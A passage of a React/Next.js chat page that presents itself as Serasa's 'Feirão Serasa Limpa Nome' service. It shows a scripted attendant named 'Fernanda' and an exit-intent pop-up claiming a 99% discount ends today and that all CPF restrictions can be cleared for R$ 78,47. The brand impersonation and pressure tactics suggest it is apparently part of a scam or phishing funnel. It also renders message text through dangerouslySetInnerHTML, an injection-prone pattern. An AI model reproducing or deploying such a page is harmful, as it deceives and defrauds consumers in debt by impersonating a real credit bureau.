                                          <span className="font-medium text-slate-700">{message.data.sexo || "Feminino"}</span>
                                        </div>
                                        <div>
                                          <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Região / Atendimento</span>
                                          <span className="font-semibold text-slate-800">{message.data.cidade || "Iracema"}</span>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                )}
                              </div>
                            ) : (
                              <div>
                                <div
                                  className={`text-sm ${message.sender === "bot" ? "text-gray-800" : "text-white"} leading-relaxed`}
                                  dangerouslySetInnerHTML={{ __html: message.content.replace(/\n/g, "<br/>") }}
                                />
                              </div>
                            )}
                          </div>

                          <p
                            className={`text-xs text-gray-500 mt-1 ${message.sender === "bot" ? "text-left" : "text-right"}`}
                          >
                            {isMounted
                              ? message.timestamp.toLocaleTimeString("pt-BR", {
                                  hour: "2-digit",
                                  minute: "2-digit",
                                })
                              : ""}
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {message.buttons && (
                  <div className="flex justify-end mt-2 mb-4">
                    <div className="space-y-2 max-w-xs w-full">
                      {message.buttons
                        .filter((button) => {
                          const buttonId = `${button.action}-${button.text}`
                          return !clickedButtons.has(buttonId)
                        })
                        .map((button, index) => (
                          <div
                            key={index}
                            onClick={() => handleButtonClick(button.action, button.text)}
                            className="bg-pink-600 hover:bg-pink-700 active:scale-[0.98] text-white text-center rounded-xl px-6 py-3.5 cursor-pointer shadow-lg hover:shadow-xl transition-all duration-200 text-sm font-bold border-0 select-none animate-pulse"
                          >
                            {button.text}
                          </div>
                        ))}
                      {message.buttons.some((button) => {
                        const buttonId = `${button.action}-${button.text}`
                        return !clickedButtons.has(buttonId)
                      }) && <div className="text-xs text-gray-400 text-right mt-1">Toque para responder</div>}
                    </div>
                  </div>
                )}
              </div>
            ))}

            {isTyping && (
              <div className="flex justify-start mb-2">
                <div className="flex items-end gap-2">
                  <div className="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 bg-pink-600 border border-pink-200 shadow-xs">
                    <Image
                      src={isFernandaJoined ? "/fernanda-avatar.jpg" : "/serasa-avatar.png"}
                      alt={isFernandaJoined ? "Fernanda Atendente" : "Serasa"}
                      width={32}
                      height={32}
                      className="w-full h-full rounded-full object-cover"
                    />
                  </div>
                  <div className="bg-gray-100 border border-gray-200 rounded-2xl rounded-bl-sm px-3.5 py-2 shadow-sm flex items-center space-x-1.5 h-8">
                    <div className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce" style={{ animationDuration: "0.8s" }}></div>
                    <div
                      className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce"
                      style={{ animationDuration: "0.8s", animationDelay: "0.15s" }}
                    ></div>
                    <div
                      className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce"
                      style={{ animationDuration: "0.8s", animationDelay: "0.3s" }}
                    ></div>
                  </div>
                </div>
              </div>
            )}

            <div ref={messagesEndRef} className="h-6 w-full" />
          </div>
        </div>
      </main>

      {/* Exit Intent Modal */}
      {showExitModal && (
        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4 backdrop-blur-xs">
          <div className="bg-white rounded-2xl max-w-sm w-full p-5 text-center shadow-2xl animate-in fade-in zoom-in-95 duration-200">
            <div className="w-12 h-12 rounded-full bg-pink-100 text-pink-600 mx-auto flex items-center justify-center mb-3">
              <ShieldCheck className="w-7 h-7" />
            </div>
            <h3 className="font-bold text-gray-900 text-lg leading-tight mb-1.5">
              Espere! Não perca seu acordo com 99% de desconto
            </h3>
            <p className="text-xs text-gray-600 mb-4 leading-relaxed">
              O Feirão Serasa Limpa Nome encerra hoje. Você pode retirar todas as restrições do seu CPF por apenas R$ 78,47!
            </p>
            <div className="space-y-2">
              <button
                onClick={() => setShowExitModal(false)}
                className="w-full bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 rounded-xl text-sm transition-all shadow-md"
              >
                Continuar Atendimento
              </button>
              <button
                onClick={() => setShowExitModal(false)}
                className="w-full text-xs text-gray-400 hover:text-gray-600 py-1"
              >
                Fechar
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

export default function ChatPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-600"></div>
        </div>
      }
    >
      <ChatContent />
    </Suspense>
  )
}